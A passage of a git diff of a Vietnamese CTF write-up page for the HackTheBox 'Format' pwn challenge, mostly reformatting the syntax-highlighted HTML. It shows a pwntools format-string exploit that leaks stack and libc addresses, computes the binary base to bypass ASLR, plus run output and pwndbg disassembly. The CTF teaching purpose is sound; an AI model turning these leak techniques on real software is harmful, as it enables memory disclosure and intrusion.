+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">leak</span> <span class="o">=</span> <span class="s2">&#34;%</span><span class="si">{}</span><span class="s2">$lx&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">leak</span> <span class="o">=</span> <span class="n">com</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;nonStopLeaking finalized...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># -------------- exploit -----------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;format&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./format&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># input(&#34;[+] attach gdb&#34;)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Launch the fmtstr exploiter</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploiter</span> <span class="o">=</span> <span class="n">FmtStr</span><span class="p">(</span><span class="n">com</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">collected_data</span> <span class="o">=</span> <span class="n">nonStopLeak</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">collected_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Tiến hành chạy, ta được kết quả:</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2077,49 +2075,47 @@ pwndbg&gt; x/i 0x00005555555550ee
 </span><span class="lnt">16
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 exploit.py
-<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format&#39;</span>
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./format&#39;</span>: pid 13390
-<span class="o">[</span>+<span class="o">]</span> attach gdb
-<span class="o">[</span>*<span class="o">]</span> Found format string offset: 6
-<span class="o">[</span>▆<span class="o">]</span> Starting nonStopLeaking <span class="o">(</span>range: <span class="m">1</span> to 40<span class="o">)</span>...
-exploit.py:11: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
-  r.sendline<span class="o">(</span>payload<span class="o">)</span>
-<span class="o">[</span>+<span class="o">]</span> nonStopLeaking finalized...
-<span class="o">[</span><span class="s1">&#39;EMPTY ON PURPOSE&#39;</span>, <span class="s1">&#39;7f2bcf7e9a03&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;7f2bcf70f142&#39;</span>, <span class="s1">&#39;7fff990a1ad0&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;61000a786c243625&#39;</span>, <span class="s1">&#39;6161616461616163&#39;</span>, <span class="s1">&#39;5241545361616165&#39;</span>, <span class="s1">&#39;444e457024362554&#39;</span>, <span class="s1">&#39;3800000000a&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;7f2bcf7ea5c0&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;7f2bcf6936a5&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;7f2bcf7ea5c0&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;7f2bcf7eb4a0&#39;</span>, <span class="s1">&#39;7f2bcf68f6bd&#39;</span>, <span class="s1">&#39;7f2bcf7ea5c0&#39;</span>, <span class="s1">&#39;7f2bcf685f65&#39;</span>, <span class="s1">&#39;55ddf1fb92d0&#39;</span>, <span class="s1">&#39;7fff990a1be0&#39;</span>, <span class="s1">&#39;55ddf1fb90c0&#39;</span>, <span class="s1">&#39;7fff990a1cf0&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;55ddf1fb926d&#39;</span>, <span class="s1">&#39;7f2bcf7eefc8&#39;</span>, <span class="s1">&#39;cdd017be270afb00&#39;</span><span class="o">]</span>
-<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 exploit.py
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./format&#39;</span>: pid <span class="m">13390</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> attach gdb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Found format string offset: <span class="m">6</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>▆<span class="o">]</span> Starting nonStopLeaking <span class="o">(</span>range: <span class="m">1</span> to 40<span class="o">)</span>...
+</span></span><span class="line"><span class="cl">exploit.py:11: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+</span></span><span class="line"><span class="cl">  r.sendline<span class="o">(</span>payload<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> nonStopLeaking finalized...
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="s1">&#39;EMPTY ON PURPOSE&#39;</span>, <span class="s1">&#39;7f2bcf7e9a03&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;7f2bcf70f142&#39;</span>, <span class="s1">&#39;7fff990a1ad0&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;61000a786c243625&#39;</span>, <span class="s1">&#39;6161616461616163&#39;</span>, <span class="s1">&#39;5241545361616165&#39;</span>, <span class="s1">&#39;444e457024362554&#39;</span>, <span class="s1">&#39;3800000000a&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;38000000380&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;7f2bcf7ea5c0&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;7f2bcf6936a5&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;7f2bcf7ea5c0&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;7f2bcf7eb4a0&#39;</span>, <span class="s1">&#39;7f2bcf68f6bd&#39;</span>, <span class="s1">&#39;7f2bcf7ea5c0&#39;</span>, <span class="s1">&#39;7f2bcf685f65&#39;</span>, <span class="s1">&#39;55ddf1fb92d0&#39;</span>, <span class="s1">&#39;7fff990a1be0&#39;</span>, <span class="s1">&#39;55ddf1fb90c0&#39;</span>, <span class="s1">&#39;7fff990a1cf0&#39;</span>, <span class="s1">&#39;0&#39;</span>, <span class="s1">&#39;55ddf1fb926d&#39;</span>, <span class="s1">&#39;7f2bcf7eefc8&#39;</span>, <span class="s1">&#39;cdd017be270afb00&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Tại đây, mình thấy có giá trị <code>0x55ddf1fb926d</code> là địa chỉ tại vị trí <code>init+117</code>, mình sẽ dùng giá trị này để tính <code>base address</code>, bypass cơ chế ASLR và giá trị này nó nằm ở bye thứ 37.</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
-</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ ./format
-➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ ./format
-%37<span class="nv">$p</span>
-0x56406ae4f26d
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ ./format
+</span></span><span class="line"><span class="cl">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ ./format
+</span></span><span class="line"><span class="cl">%37<span class="nv">$p</span>
+</span></span><span class="line"><span class="cl">0x56406ae4f26d
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Do cơ chế <code>ASLR</code> nên giá trị này sẽ khác ở mỗi lần chạy. Bước thứ nhất, chúng ta sẽ vượt qua được cơ chế <code>ASLR</code> với đoạn code sau:</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2167,58 +2163,58 @@ exploit.py:11: BytesWarning: Text is not bytes<span class="p">;</span> assuming 
 </span><span class="lnt">46
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
-
-<span class="c1"># HOST = &#39;64.227.36.245&#39;</span>
-<span class="c1"># PORT = 30730</span>
-
-<span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
-
-<span class="c1"># -----------------------</span>
-<span class="k">def</span> <span class="nf">com</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">wait</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
-	<span class="k">global</span> <span class="n">r</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-	<span class="k">if</span> <span class="p">(</span><span class="n">wait</span><span class="p">):</span>
-		<span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-
-
-<span class="k">def</span> <span class="nf">nonStopLeak</span><span class="p">():</span>
-	<span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
-	<span class="n">min_val</span> <span class="o">=</span> <span class="mi">1</span>
-	<span class="n">max_val</span> <span class="o">=</span> <span class="mi">40</span>
-	<span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Starting nonStopLeaking (range: </span><span class="si">%d</span><span class="s2"> to </span><span class="si">%d</span><span class="s2">)...&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">))</span>
-	<span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;EMPTY ON PURPOSE&#34;</span><span class="p">)</span>
-	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">):</span>
-		<span class="n">leak</span> <span class="o">=</span> <span class="s2">&#34;%</span><span class="si">{}</span><span class="s2">$lx&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
-		<span class="n">leak</span> <span class="o">=</span> <span class="n">com</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
-		<span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
-
-	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;nonStopLeaking finalized...&#34;</span><span class="p">)</span>
-	<span class="k">return</span> <span class="n">data</span>
-
-
-<span class="c1"># -------------- exploit -----------------------</span>
-
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./format&#34;</span><span class="p">)</span>
-
-<span class="n">init_117</span> <span class="o">=</span> <span class="mh">0x126d</span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./format&#34;</span><span class="p">)</span>
-<span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] attach gdb&#34;</span><span class="p">)</span>
-
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%37$p&#39;</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-
-<span class="n">init_leak</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;LEAK : init+117 address: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">init_leak</span><span class="p">))</span>
-<span class="n">base_elf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">init_leak</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x126d</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Base ELF address: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_elf</span><span class="p">)))</span>
-<span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">base_elf</span> 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># HOST = &#39;64.227.36.245&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># PORT = 30730</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">com</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">wait</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">global</span> <span class="n">r</span>
+</span></span><span class="line"><span class="cl">	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">wait</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">nonStopLeak</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">	<span class="n">min_val</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">	<span class="n">max_val</span> <span class="o">=</span> <span class="mi">40</span>
+</span></span><span class="line"><span class="cl">	<span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Starting nonStopLeaking (range: </span><span class="si">%d</span><span class="s2"> to </span><span class="si">%d</span><span class="s2">)...&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;EMPTY ON PURPOSE&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">min_val</span><span class="p">,</span> <span class="n">max_val</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">leak</span> <span class="o">=</span> <span class="s2">&#34;%</span><span class="si">{}</span><span class="s2">$lx&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">leak</span> <span class="o">=</span> <span class="n">com</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="n">data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;nonStopLeaking finalized...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">data</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># -------------- exploit -----------------------</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./format&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">init_117</span> <span class="o">=</span> <span class="mh">0x126d</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./format&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">input</span><span class="p">(</span><span class="s2">&#34;[+] attach gdb&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%37$p&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">init_leak</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;LEAK : init+117 address: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">init_leak</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_elf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">init_leak</span><span class="p">,</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x126d</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Base ELF address: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_elf</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">base_elf</span> 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="bước-2-leak-địa-chỉ-__printf-từ-libc-thông-qua-printf">Bước 2: Leak địa chỉ __printf từ libc thông qua printf()</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2247,41 +2243,41 @@ exploit.py:11: BytesWarning: Text is not bytes<span class="p">;</span> assuming 
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">pwndbg&gt; disassemble <span class="nb">echo</span>
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> echo:
-   0x0000559e0bc191a9 &lt;+0&gt;:	endbr64 
-   0x0000559e0bc191ad &lt;+4&gt;:	push   rbp
-   0x0000559e0bc191ae &lt;+5&gt;:	mov    rbp,rsp
-   0x0000559e0bc191b1 &lt;+8&gt;:	sub    rsp,0x110
-   0x0000559e0bc191b8 &lt;+15&gt;:	mov    rax,QWORD PTR fs:0x28
-   0x0000559e0bc191c1 &lt;+24&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>,rax
-   0x0000559e0bc191c5 &lt;+28&gt;:	xor    eax,eax
-   0x0000559e0bc191c7 &lt;+30&gt;:	mov    rdx,QWORD PTR <span class="o">[</span>rip+0x2e62<span class="o">]</span>        <span class="c1"># 0x559e0bc1c030 &lt;stdin@@GLIBC_2.2.5&gt;</span>
-   0x0000559e0bc191ce &lt;+37&gt;:	lea    rax,<span class="o">[</span>rbp-0x110<span class="o">]</span>
-   0x0000559e0bc191d5 &lt;+44&gt;:	mov    esi,0x100
-   0x0000559e0bc191da &lt;+49&gt;:	mov    rdi,rax
-   0x0000559e0bc191dd &lt;+52&gt;:	call   0x559e0bc190a0 &lt;fgets@plt&gt;
-   0x0000559e0bc191e2 &lt;+57&gt;:	lea    rax,<span class="o">[</span>rbp-0x110<span class="o">]</span>
-   0x0000559e0bc191e9 &lt;+64&gt;:	mov    rdi,rax
-   0x0000559e0bc191ec &lt;+67&gt;:	mov    eax,0x0
-   0x0000559e0bc191f1 &lt;+72&gt;:	call   0x559e0bc19090 &lt;printf@plt&gt;
-   0x0000559e0bc191f6 &lt;+77&gt;:	jmp    0x559e0bc191c7 &lt;echo+30&gt;
-End of assembler dump.
-pwndbg&gt; disassemble 0x559e0bc19090
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> printf@plt:
-   0x0000559e0bc19090 &lt;+0&gt;:	endbr64 
-   0x0000559e0bc19094 &lt;+4&gt;:	bnd jmp QWORD PTR <span class="o">[</span>rip+0x2f25<span class="o">]</span>        <span class="c1"># 0x559e0bc1bfc0 &lt;printf@got.plt&gt;</span>
-   0x0000559e0bc1909b &lt;+11&gt;:	nop    DWORD PTR <span class="o">[</span>rax+rax*1+0x0<span class="o">]</span>
-End of assembler dump.
-pwndbg&gt; 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pwndbg&gt; disassemble <span class="nb">echo</span>
+</span></span><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> echo:
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191a9 &lt;+0&gt;:	endbr64 
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191ad &lt;+4&gt;:	push   rbp
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191ae &lt;+5&gt;:	mov    rbp,rsp
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191b1 &lt;+8&gt;:	sub    rsp,0x110
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191b8 &lt;+15&gt;:	mov    rax,QWORD PTR fs:0x28
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191c1 &lt;+24&gt;:	mov    QWORD PTR <span class="o">[</span>rbp-0x8<span class="o">]</span>,rax
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191c5 &lt;+28&gt;:	xor    eax,eax
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191c7 &lt;+30&gt;:	mov    rdx,QWORD PTR <span class="o">[</span>rip+0x2e62<span class="o">]</span>        <span class="c1"># 0x559e0bc1c030 &lt;stdin@@GLIBC_2.2.5&gt;</span>
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191ce &lt;+37&gt;:	lea    rax,<span class="o">[</span>rbp-0x110<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191d5 &lt;+44&gt;:	mov    esi,0x100
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191da &lt;+49&gt;:	mov    rdi,rax
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191dd &lt;+52&gt;:	call   0x559e0bc190a0 &lt;fgets@plt&gt;
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191e2 &lt;+57&gt;:	lea    rax,<span class="o">[</span>rbp-0x110<span class="o">]</span>
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191e9 &lt;+64&gt;:	mov    rdi,rax
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191ec &lt;+67&gt;:	mov    eax,0x0
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191f1 &lt;+72&gt;:	call   0x559e0bc19090 &lt;printf@plt&gt;
+</span></span><span class="line"><span class="cl">   0x0000559e0bc191f6 &lt;+77&gt;:	jmp    0x559e0bc191c7 &lt;echo+30&gt;
+</span></span><span class="line"><span class="cl">End of assembler dump.
+</span></span><span class="line"><span class="cl">pwndbg&gt; disassemble 0x559e0bc19090
+</span></span><span class="line"><span class="cl">Dump of assembler code <span class="k">for</span> <span class="k">function</span> printf@plt:
+</span></span><span class="line"><span class="cl">   0x0000559e0bc19090 &lt;+0&gt;:	endbr64 
+</span></span><span class="line"><span class="cl">   0x0000559e0bc19094 &lt;+4&gt;:	bnd jmp QWORD PTR <span class="o">[</span>rip+0x2f25<span class="o">]</span>        <span class="c1"># 0x559e0bc1bfc0 &lt;printf@got.plt&gt;</span>
+</span></span><span class="line"><span class="cl">   0x0000559e0bc1909b &lt;+11&gt;:	nop    DWORD PTR <span class="o">[</span>rax+rax*1+0x0<span class="o">]</span>
+</span></span><span class="line"><span class="cl">End of assembler dump.
+</span></span><span class="line"><span class="cl">pwndbg&gt; 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Chúng ta sử dụng <code>%s</code> thay vì <code>%p</code> bởi vì <code>%s</code> sẽ đọc địa giá trị bên trong vùng nhớ được truyền vào printf và in ra cho đến khi gặp giá trị null. Điều đó có nghĩa nếu địa chỉ của vùng <code>GOT</code> được đưa vào thì chúng ta có thể in nó sẽ in ra địa chỉ của libc đang chứa trong nó. Cụ thể chúng ta sẽ thực hiện như sau:</li>
 </ul>
